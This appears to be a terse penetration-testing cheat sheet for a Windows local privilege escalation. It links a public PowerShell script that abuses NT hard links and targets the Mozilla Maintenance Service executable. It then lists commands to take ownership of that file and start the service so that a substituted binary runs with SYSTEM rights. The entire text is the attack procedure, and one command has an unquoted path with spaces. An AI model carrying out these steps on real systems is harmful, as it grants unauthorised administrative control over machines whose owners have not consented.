NT hard link: https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

**Target File
```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

- Run powershell script

**Taking Ownership of the File
```
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

**Starting the Mozilla Maintenance Service
```
sc.exe start MozillaMaintenance
```
